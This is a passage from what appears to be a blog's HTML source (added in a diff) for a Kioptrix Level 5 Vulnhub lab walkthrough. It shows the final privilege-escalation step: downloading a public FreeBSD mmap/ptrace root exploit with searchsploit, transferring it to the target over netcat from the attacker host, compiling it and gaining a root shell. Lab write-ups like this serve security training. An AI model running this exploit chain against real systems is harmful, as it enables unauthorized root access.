+        data-srcset="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png 1.5x, /es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png 2x"
+        data-sizes="auto"
+        alt="/es/kioptrix_level_5/Kioptrix%20level%205%200288b0f1d65b46d899e4bdd1fbcaae33/Untitled%209.png"
+        title="Untitled" width="518" height="151" /></p>
+<p>There is an exploit to escalate privileges so I download it on my machine and then transfer it to the target machine with netcat.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">searchsploit -m freebsd/local/26368.c
+</span></span><span class="line"><span class="cl">  Exploit: FreeBSD 9.0 &lt; 9.1 - <span class="s1">&#39;mmap/ptrace&#39;</span> Local Privilege Escalation
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/26368
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c
+</span></span><span class="line"><span class="cl">    Codes: CVE-2013-2171, OSVDB-94414
+</span></span><span class="line"><span class="cl"> Verified: True
+</span></span><span class="line"><span class="cl">File Type: C source, ASCII text
+</span></span><span class="line"><span class="cl">Copied to: /home/kali/vulnhub/OSCP/kioptrix_level_5/26368.c</span></span></code></pre></div></div>
+<p>I listen on my kali and connect from the target machine to perform the transfer in the /tmp directory.</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#Kali</span>
+</span></span><span class="line"><span class="cl">nc -lvp <span class="m">4444</span> &lt; 26368.c                            
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">4444</span> ...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#kioptrix</span>
+</span></span><span class="line"><span class="cl">nc -nv 192.168.66.152 <span class="m">4444</span> &gt; 26368.c                                                                                                                                                                                                        
+</span></span><span class="line"><span class="cl">Connection to 192.168.66.152 <span class="m">4444</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!</span></span></code></pre></div></div>
+<p>once transferred I compile the exploit and run it getting a shell as root</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc 26368.c -o exploit
+</span></span><span class="line"><span class="cl">./exploit
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>wheel<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>80<span class="o">(</span>www<span class="o">)</span>
+</span></span><span class="line"><span class="cl">cat congrats.txt
+</span></span><span class="line"><span class="cl">If you are reading this, it means you got root <span class="o">(</span>or cheated<span class="o">)</span>.</span></span></code></pre></div></div>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-09-02</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/en/kioptrix_level_5/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough" data-hashtags="Walkthrough,Vulnhub,TjNull,OSCP,Easy"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/en/kioptrix_level_5/" data-hashtag="Walkthrough"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/en/kioptrix_level_5/"><i class="fab fa-linkedin" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="http://localhost:1313/en/kioptrix_level_5/" data-title="Kioptrix Level 5 Walkthrough" data-description=""><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=http%3a%2f%2flocalhost%3a1313%2fen%2fkioptrix_level_5%2f&amp;text=Kioptrix%20Level%205%20Walkthrough" target="_blank" title="Share on Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/en/tags/walkthrough/">Walkthrough</a>,&nbsp;<a href="/en/tags/vulnhub/">Vulnhub</a>,&nbsp;<a href="/en/tags/tjnull/">TjNull</a>,&nbsp;<a href="/en/tags/oscp/">OSCP</a>,&nbsp;<a href="/en/tags/easy/">Easy</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/en/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/en/kioptrix_level_3/" class="prev" rel="prev" title="Kioptrix Level 3 Walkthrough"><i class="fas fa-angle-left" aria-hidden="true"></i>Kioptrix Level 3 Walkthrough</a>
+            <a href="/en/dc-9/" class="next" rel="next" title="DC-9 Walkthrough">DC-9 Walkthrough<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.157.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/en/" target="_blank">AnTuSec</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/algoliasearch/lite/browser.umd.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"search":{"algoliaAppID":"4D1IDY8JU6","algoliaIndex":"index","algoliaSearchKey":"05332ac5ed76655a511f0da583a9afac","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script src="/js/theme.js"></script></body>
+</html>
